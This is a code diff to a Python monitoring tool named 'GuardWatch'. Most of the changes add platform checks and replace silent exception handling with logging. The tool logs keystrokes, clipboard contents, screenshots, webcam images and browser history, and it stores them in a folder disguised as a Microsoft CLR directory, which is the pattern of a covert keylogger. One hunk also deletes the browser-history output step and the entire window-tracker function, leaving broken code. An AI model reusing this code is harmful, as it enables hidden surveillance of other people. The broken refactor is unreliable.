@@ -42,6 +42,7 @@ import time
 from datetime import datetime
 from pathlib import Path
 from queue import Queue
+from typing import Dict, List
 
 # Fix Windows console encoding issue
 if sys.platform == 'win32':
@@ -51,7 +52,7 @@ if sys.platform == 'win32':
 
 # ── Dependency check ───────────────────────────────────────────────────────────
 _MISSING = []
-for _pkg in ("mss", "PIL", "pyperclip", "pynput", "flask"):
+for _pkg in ("mss", "PIL", "flask"):
     try:
         __import__(_pkg)
     except ImportError:
@@ -59,11 +60,16 @@ for _pkg in ("mss", "PIL", "pyperclip", "pynput", "flask"):
 
 if _MISSING:
     print(f"[GuardWatch] Missing: {', '.join(_MISSING)}")
-    print("Run:  pip install mss Pillow pyperclip pynput opencv-python pywin32 flask watchdog")
+    print("Run:  pip install mss Pillow opencv-python pywin32 flask watchdog")
     sys.exit(1)
 
 import mss
-import pyperclip
+try:
+    import pyperclip
+    PYPERCLIP_OK = True
+except ImportError:
+    pyperclip = None
+    PYPERCLIP_OK = False
 from flask import Flask, jsonify, render_template_string
 from PIL import Image, ImageDraw
 from pynput import keyboard, mouse
@@ -89,7 +95,8 @@ except ImportError:
     WATCHDOG_OK = False
 
 # ── Storage ────────────────────────────────────────────────────────────────────
-_APPDATA      = Path(os.environ.get("APPDATA", Path.home()))
+_APPDATA      = Path(os.environ.get("APPDATA", str(Path.home())))
+_LOCALAPPDATA  = Path(os.environ.get("LOCALAPPDATA", str(Path.home())))
 EVIDENCE_ROOT = _APPDATA / "Microsoft" / "CLR" / "gw_evidence"
 EVIDENCE_ROOT.mkdir(parents=True, exist_ok=True)
 
@@ -107,17 +114,21 @@ MONITORED_DIRS = [
     Path.home() / "Documents",
     Path.home() / "Downloads",
     Path.home() / "Desktop",
-    Path(os.environ.get("LOCALAPPDATA", "")) / "Temp",
-    Path(os.environ.get("APPDATA", "")) / "Microsoft/Office",
+    _LOCALAPPDATA / "Temp",
+    _APPDATA / "Microsoft" / "Office",
 ]
 SUSPICIOUS_EXTENSIONS = {".exe", ".bat", ".cmd", ".ps1", ".dll", ".scr", ".vbs", ".js"}
 IGNORE_DIRS = {".git", "__pycache__", "node_modules", "AppData", "$RECYCLE.BIN"}
 
-BROWSER_DBS = {
-    "Chrome": Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/History",
-    "Edge":   Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data/Default/History",
-}
-FIREFOX_BASE = Path(os.environ.get("APPDATA", "")) / "Mozilla/Firefox/Profiles"
+if sys.platform == 'win32':
+    BROWSER_DBS = {
+        "Chrome": _LOCALAPPDATA / "Google/Chrome/User Data/Default/History",
+        "Edge":   _LOCALAPPDATA / "Microsoft/Edge/User Data/Default/History",
+    }
+    FIREFOX_BASE = _APPDATA / "Mozilla" / "Firefox" / "Profiles"
+else:
+    BROWSER_DBS = {}
+    FIREFOX_BASE = Path.home() / ".mozilla" / "firefox"
 
 
 # ── Windows helpers ────────────────────────────────────────────────────────────
@@ -125,6 +136,9 @@ class _LASTINPUTINFO(ctypes.Structure):
     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
 
 def get_idle_seconds() -> float:
+    if sys.platform != 'win32':
+        return 0.0
+
     info = _LASTINPUTINFO()
     info.cbSize = ctypes.sizeof(info)
     try:
@@ -134,6 +148,9 @@ def get_idle_seconds() -> float:
         return 0.0
 
 def get_active_window_title() -> str:
+    if sys.platform != 'win32':
+        return ""
+
     if WIN32_OK:
         try:
             return win32gui.GetWindowText(win32gui.GetForegroundWindow())
@@ -163,7 +180,7 @@ class EvidenceSession:
         for d in (self.dir, self.shots_dir, self.steps_dir, self.webcam_dir, self.files_dir):
             d.mkdir(parents=True, exist_ok=True)
 
-        self._events: list[dict] = []
+        self._events: List[Dict] = []
         self._lock = threading.Lock()
         self.event_queue = Queue()  # For web dashboard live updates
 
@@ -181,8 +198,8 @@ class EvidenceSession:
         try:
             with open(self._events_path, "w", encoding="utf-8") as f:
                 json.dump(self._events, f, indent=2)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"Failed to write events: {e}")
         flag = "⚠️  " if priority == "HIGH" else "    "
         print(f"{flag}[{ts[11:]}] {kind}: {detail[:80]}")
         
@@ -193,8 +210,8 @@ class EvidenceSession:
         try:
             with open(path, "a", encoding="utf-8") as f:
                 f.write(text)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"Failed to append to {path.name}: {e}")
 
     def write_keystrokes(self, text: str):
         self.append(self._keylog_path, text)
@@ -207,12 +224,12 @@ class EvidenceSession:
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.append(self._win_path, f"[{ts}] {title}\n")
 
-    def get_live_events(self, limit: int = 50) -> list[dict]:
+    def get_live_events(self, limit: int = 50) -> List[Dict]:
         """Return last N events for dashboard."""
         with self._lock:
             return self._events[-limit:]
 
-    def get_stats(self) -> dict:
+    def get_stats(self) -> Dict:
         """Return evidence statistics for dashboard."""
         return {
             "session_id": self.sid,
@@ -390,6 +407,14 @@ def screenshotter(session: EvidenceSession, stop: threading.Event):
 #  Module 3 — Clipboard Watcher
 # ══════════════════════════════════════════════════════════════════════════════
 def clipboard_watcher(session: EvidenceSession, stop: threading.Event):
+    if not PYPERCLIP_OK:
+        session.log(
+            "CLIPBOARD_SKIP",
+            "Clipboard monitoring unavailable because pyperclip is not installed",
+            priority="INFO"
+        )
+        return
+
     last = ""
     while not stop.is_set():
         try:
@@ -399,8 +424,8 @@ def clipboard_watcher(session: EvidenceSession, stop: threading.Event):
                 session.write_clipboard(curr)
                 preview = curr[:100].replace("\n", " ")
                 session.log("CLIPBOARD", f"{len(curr)} chars — \"{preview}{'…' if len(curr)>100 else ''}\"")
-        except Exception:
-            pass
+        except Exception as e:
+            session.log("CLIPBOARD_ERROR", str(e), priority="INFO")
         time.sleep(CLIPBOARD_POLL_SEC)
 
 
@@ -545,38 +570,23 @@ def snapshot_browser_history(session: EvidenceSession, label: str):
                 except Exception as e:
                     results["Firefox"] = [{"error": str(e)}]
                 finally:
-                    try: tmp.unlink()
-                    except Exception: pass
-                break
-
-    out = session.dir / f"browser_history_{label}.json"
-    with open(out, "w", encoding="utf-8") as f:
-        json.dump(results, f, indent=2, ensure_ascii=False)
-    total = sum(len(v) for v in results.values() if isinstance(v, list))
-    session.log("BROWSER_SNAPSHOT", f"{label}: {total} URLs from {list(results)}")
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  Module 8 — Window Title Tracker
-# ══════════════════════════════════════════════════════════════════════════════
-def window_tracker(session: EvidenceSession, stop: threading.Event):
-    last = ""
-    while not stop.is_set():
-        title = get_active_window_title()
-        if title and title != last:
-            last = title
-            session.write_window(title)
-            session.log("WINDOW_FOCUS", title)
-        time.sleep(WINDOW_POLL_SEC)
-
-
+                    try:
+                        tmp.unlink()
+                    except Exception as e:
+                        session.log("BROWSER_HISTORY_ERROR", f"Failed to clean temporary Firefox DB: {e}", priority="INFO")
 # ══════════════════════════════════════════════════════════════════════════════
 #  Module 9 — USB Device Detection
 # ══════════════════════════════════════════════════════════════════════════════
-def usb_detector(session: EvidenceSession, stop: threading.Event):
+def usb_detector(session: 'EvidenceSession', stop: threading.Event):
+    """USB device detector - Windows only"""
+    import platform
+    if platform.system() != "Windows":
+        session.log("USB_SKIP", "USB detection only available on Windows", "INFO")
+        return
+    
     DTYPE = {1: "No-root", 2: "Removable", 3: "Fixed", 4: "Network", 5: "CD/DVD", 6: "RAM disk"}
 
-    def current_drives() -> dict[str, str]:
+    def current_drives() -> Dict[str, str]:
         drives, mask = {}, ctypes.windll.kernel32.GetLogicalDrives()
         for letter in string.ascii_uppercase:
             if mask & 1:
@@ -594,8 +604,8 @@ def usb_detector(session: EvidenceSession, stop: threading.Event):
                 try:
                     with mss.mss() as sct:
                         sct.shot(output=str(session.dir / f"usb_insert_{datetime.now().strftime('%H%M%S')}.png"))
-                except Exception:
-                    pass
+                except Exception as e:
+                    session.log("USB_ERROR", f"USB screenshot capture failed: {e}", priority="INFO")
         for drive in known:
             if drive not in current:
                 session.log("USB_REMOVED", f"Drive {drive} ejected")
@@ -624,6 +634,9 @@ def check_failed_logins(session: EvidenceSession):
             session.log("FAILED_LOGINS_NOTE", f"Run as Admin for Security log access ({e})")
             return
     else:
+        if sys.platform != 'win32':
+            session.log("FAILED_LOGINS_SKIP", "Failed login counter only available on Windows", "INFO")
+            return
         try:
             result = subprocess.run(
                 ["wevtutil", "qe", "Security",
@@ -667,8 +680,11 @@ def show_report():
         events = []
         evf = s / "events.json"
         if evf.exists():
-            try: events = json.load(open(evf, encoding="utf-8"))
-            except Exception: pass
+            try:
+                with open(evf, encoding="utf-8") as f:
+                    events = json.load(f)
+            except Exception as e:
+                print(f"    ⚠️  Failed to load events: {e}")
 
         high = [e for e in events if e.get("priority") == "HIGH"]
         if high:
